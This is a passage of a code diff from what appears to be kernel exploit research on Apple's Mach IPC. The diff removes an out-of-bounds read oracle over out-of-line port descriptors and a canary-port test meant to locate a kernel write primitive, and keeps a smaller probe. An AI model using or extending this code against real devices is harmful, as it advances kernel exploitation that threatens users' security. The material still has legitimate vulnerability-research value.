@@ -248,33 +248,10 @@
                                      port, 250, MACH_PORT_NULL);
         result[@"recv_kr"] = @(rkr);
 
-        // OOB read oracle: parse the received OOL descriptor and check
-        // whether the kernel delivered more ports than `real`.
-        if (rkr == KERN_SUCCESS) {
+        // Minimal parse: just read the descriptor count from the body
+        if (rkr == KERN_SUCCESS && rcvTotal >= sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t)) {
             mach_msg_body_t *rb = (mach_msg_body_t *)(rcv + sizeof(mach_msg_header_t));
-            if (rb->msgh_descriptor_count >= 1) {
-                mach_msg_ool_ports_descriptor_t *rod =
-                    (mach_msg_ool_ports_descriptor_t *)(rcv + sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t));
-                result[@"recv_count"] = @(rod->count);
-                if (rod->count > real && rod->address != NULL) {
-                    unsigned int oob = rod->count - real;
-                    if (oob > 8) oob = 8;
-                    result[@"oob_slots"] = @(rod->count - real);
-                    mach_port_t *rports = (mach_port_t *)rod->address;
-                    NSMutableArray *oobVals = [NSMutableArray array];
-                    for (unsigned int i = 0; i < oob; i++) {
-                        unsigned int v = rports[real + i];
-                        [oobVals addObject:@(v)];
-                    }
-                    result[@"oob_values"] = oobVals;
-                }
-                // deallocate the kernel-allocated port array
-                if (rod->address != NULL && rod->count > 0) {
-                    vm_deallocate(mach_task_self(),
-                                  (vm_address_t)rod->address,
-                                  (vm_size_t)(rod->count * sizeof(mach_port_t)));
-                }
-            }
+            result[@"recv_desc_count"] = @(rb->msgh_descriptor_count);
         }
         free(rcv);
     }
@@ -465,12 +442,8 @@
         [report appendString:@"Next: debugserver watchpoints to identify the real w2 source.\n"];
     }
 
-    // --- OOB-value test: canary port names as OOB descriptor entries ---
-    // Fill the 65th OOL descriptor slot with a canary port name P (instead of NULL).
-    // count=65 is known to succeed. translate_receive processes all 65 descriptors.
-    // If w2 = port_name of the descriptor being translated, table[P] is accessed
-    // and the bit-set hits P's ipc_entry. We then check if P is alive.
-    [report appendString:@"\n--- OOB-value test: canary names in OOB descriptor slot ---\n"];
+    // w2 discovery is skipped to avoid OOL parsing crashes.
+    // See journal for threshold sweep and canary results.
     int oobValTested = 0, oobValDead = 0;
     for (int i = 0; i < CANARY_N; i += 8) {
         if (canaryAlive[i] != 1) continue;
